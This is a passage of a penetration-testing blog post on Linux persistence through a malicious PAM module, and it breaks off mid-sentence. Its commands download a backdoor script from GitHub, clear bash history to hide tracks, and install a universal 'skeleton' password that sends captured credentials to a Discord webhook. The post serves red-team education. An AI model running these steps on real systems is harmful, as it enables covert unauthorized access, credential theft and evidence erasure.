---
title: The “P” in PAM is for Persistence: Linux Persistence Technique
url: https://www.blackhillsinfosec.com/the-p-in-pam-is-for-persistence-linux-persistence-technique/
source: Black Hills Information Security, Inc.
date: 2026-03-04
fetch_date: 2026-03-05T04:06:39.175176
---

# The “P” in PAM is for Persistence: Linux Persistence Technique

[![Black Hills Information Security, Inc.](https://www.blackhillsinfosec.com/wp-content/uploads/2025/03/BHIS_TEXT_BHIS.png)](https://www.blackhillsinfosec.com "Black Hills Information Security, Inc.")

[RSS](https://www.blackhillsinfosec.com/feed/)

* [All Services](https://www.blackhillsinfosec.com/services/)
  + [Complete Service Guide](https://www.blackhillsinfosec.com/services/complete-service-guide/)
  + [Active SOC](https://www.blackhillsinfosec.com/services/active-soc/)
  + [AI Security Assessments](https://www.blackhillsinfosec.com/services/ai-security-assessments/)
  + [Blockchain Security](https://www.blackhillsinfosec.com/services/blockchain-security/)
  + [Blue Team Services](https://www.blackhillsinfosec.com/services/blue-team-services/)
  + [Continuous Penetration Testing](https://www.blackhillsinfosec.com/services/antisoc/)
  + [High-Profile Risk Assessments](https://www.blackhillsinfosec.com/services/high-profile-risk-assessments/)
  + [Incident Response](https://www.blackhillsinfosec.com/services/incident-response/)
  + [Penetration Testing](https://www.blackhillsinfosec.com/services/)
* [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Contact Us](https://www.blackhillsinfosec.com/contact-us/)
  + [Email Sign-Up](https://mailchi.mp/blackhillsinfosec.com/bhis-sign-up)
* [About Us](https://www.blackhillsinfosec.com/who-we-are/)
  + [Security Consultants](https://www.blackhillsinfosec.com/about/security-consultants/)
  + [Admin](https://www.blackhillsinfosec.com/about/admin-staff/)
  + [SOC Team](https://www.blackhillsinfosec.com/about/soc-team/)
  + [Antisyphon Training](https://www.blackhillsinfosec.com/about/antisyphon/)
  + [BHIS Tribe of Companies](https://www.blackhillsinfosec.com/bhis-tribe-of-companies/)
* [Free Resources](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Blogs](https://www.blackhillsinfosec.com/blog/)
  + [Free Cybersecurity Tools](https://www.blackhillsinfosec.com/free-cybersecurity-tools/)
  + [Free Cybersecurity Webcasts](https://www.blackhillsinfosec.com/free_cybersecurity_webcasts/)
  + [Podcasts](https://bhispodcasts.transistor.fm/)
  + [RITA](https://www.activecountermeasures.com/free-tools/rita/)
* [Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [BHIS & Antisyphon Training](https://www.blackhillsinfosec.com/bhis-and-antisyphon-training/)
  + [WWHF Conference](https://wildwesthackinfest.com)
* [Community](https://blackhillsinfosec.com/community)
  + [Discord](https://discord.gg/BHIS)
  + [LinkedIn](https://www.linkedin.com/company/black-hills-information-security/)
  + [YouTube](https://www.youtube.com/c/BlackHillsInformationSecurity/videos)
  + [Bluesky](https://bsky.app/profile/bhinfosecurity.bsky.social)
  + [Twitter/X](https://twitter.com/BHinfoSecurity)
  + [Upcoming Events](https://blackhillsinfosec.com/events)
* [Fun Stuff](https://spearphish-general-store.myshopify.com/)
  + [Backdoors & Breaches](https://www.blackhillsinfosec.com/tools/backdoorsandbreaches/)
  + [Merch, Zines & More](https://spearphish-general-store.myshopify.com/)
  + [PROMPT# Zine](https://www.blackhillsinfosec.com/prompt-zine/)
  + [REKCAH](https://www.blackhillsinfosec.com/rekcah/)
  + [Books](https://www.blackhillsinfosec.com/tools/books/)

4
Mar
2026

[Ben Bowman](https://www.blackhillsinfosec.com/category/author/ben-bowman/), [Linux](https://www.blackhillsinfosec.com/category/linux/), [Red Team](https://www.blackhillsinfosec.com/category/red-team/), [Red Team Tools](https://www.blackhillsinfosec.com/category/red-team/tool-red-team/)

# [The “P” in PAM is for Persistence: Linux Persistence Technique](https://www.blackhillsinfosec.com/the-p-in-pam-is-for-persistence-linux-persistence-technique/)

![](https://www.blackhillsinfosec.com/wp-content/uploads/2025/02/BBowman-150x150.png)

| [Ben Bowman](https://www.blackhillsinfosec.com/team/ben-bowman/)

Ben Bowman is a Security Analyst at Black Hills Information Security. He graduated in 2024 with a degree in cyber operations. Ben conducts research as well as tool development outside of testing.

![Linux Persistence For Pentesters](https://www.blackhillsinfosec.com/wp-content/uploads/2026/02/pam_persistence_header.png)

## The Knowledge Gap

Working as a tester has allowed me to quickly learn a variety of new skills. I have gained experience working on initial access, reconnaissance, and external and internal network methodology. However, one of the areas of knowledge where I have lacked depth is persistence techniques. I rarely worry about losing access while testing; would I be able to regain access if I did? This question led me to discover a fun and easy way to gain persistence on an internal network through the Linux Pluggable Authentication Modules (PAM).

## The Linux PAM

When dealing with persistence on Linux we have a leg up since very few, if any, Linux hosts use antivirus. We can use this to our advantage and be more invasive than we would on Windows. SSH is ubiquitous on Linux machines, making it a reliable target when attacking them. When authenticating via SSH, SSHd initiates a request to the **Pluggable Authentication Modules** library rather than handling the credentials itself.

PAM is the framework used in Linux and Unix systems to manage how applications authenticate users. Instead of each program (like SSH, FTP, or the login screen) having its own hard-coded logic for checking passwords, they outsource that task to PAM which then consults the specific configuration file located at /etc/pam.d/sshd to determine which security policies to apply. Based on these rules, PAM checks a variety of conditions such as password validity, account expiration, or multi-factor tokens. Finally, PAM passes a “Success or “Failure” back to the application that determines whether the application can grant or deny access.

## A Wolf in PAM Clothing

What would happen if we replaced PAM with a malicious version? In theory, because PAM receives clear text credentials during authentication, we could swap the PAM with a modified version that adds a universal password (skeleton key) to all user accounts. If we did this, we would be able to bypass the user’s password with our own, even if the user changes their password. Furthermore, we could even capture the user’s password pre-encryption and exfiltrate it for later use.

## PAM Skeleton Key Steps

I took an old tool and revamped it, adding new features and Quality of Life improvements. PAM Skeleton Key (<https://github.com/her3ticAVI/PAMSkeletonKey>) is a proof-of-concept created to make the theory of a malicious PAM into reality. I am going to demonstrate what using this tool looks like. Note that you will need to have root access on the Linux host to use this tool.

### 1. Installing the Tool

I ran the following command to silently install the PAM Skeleton Key.

```
"
curl -O https://raw.githubusercontent.com/her3ticAVI/linux-pam-backdoor/master/.backdoor.sh

sudo chmod +x .backdoor.sh

cat /dev/null > ~/.bash_history && history -c
"
```

![Installing PAM Skeleton Key](https://www.blackhillsinfosec.com/wp-content/uploads/2026/02/installing-pam-skeleton-key.png)

Installing PAM Skeleton Key

At this point, the tool was ready to use; I cleared the bash history to cover my tracks.

### 2. Creating the Backdoor Password

I ran the following command to create the universal password “skeleton” and a webhook to my discord server.

```
"
sudo ./.backdoor.sh -p skeleton --webhook https://discord.com/api/webhooks/REDACTED
"
```

![PAM File Backdoored](https://www.blackhillsinfosec.com/wp-content/uploads/2026/02/pam-backdoor-persistence.png)

PAM File Backdoored

Once this was done, I rebooted the host and logged in using the password I set: “skeleton”.

![Webhook Notification](https://www.blackhillsinfosec.com/wp-content/uploads/2026/02/user-and-password-captured.png)

Webhook Notification

When I authenticated, the credentials were sent to the Discord webhook. I successfully ...